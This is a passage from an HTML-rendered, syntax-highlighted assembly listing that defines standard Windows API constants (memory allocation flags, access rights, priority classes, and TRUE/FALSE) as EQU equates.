</span><span class="sc5">GMEM_NOT_BANKED</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000001000h</span><span class="sc0">
</span><span class="sc5">GMEM_SHARE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000002000h</span><span class="sc0">
</span><span class="sc5">GMEM_DDESHARE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000002000h</span><span class="sc0">
</span><span class="sc5">GMEM_NOTIFY</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000004000h</span><span class="sc0">
</span><span class="sc5">GMEM_LOWER</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000001000h</span><span class="sc0">

</span><span class="sc5">GENERIC_READ</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">

</span><span class="sc5">NORMAL_PRIORITY_CLASS</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000020h</span><span class="sc0">
</span><span class="sc5">IDLE_PRIORITY_CLASS</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000040h</span><span class="sc0">
</span><span class="sc5">HIGH_PRIORITY_CLASS</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000080h</span><span class="sc0">

</span><span class="sc5">FALSE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TRUE</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">MEM_COMMIT</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">MEM_RESERVE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">

   </span></div></body>
</html>
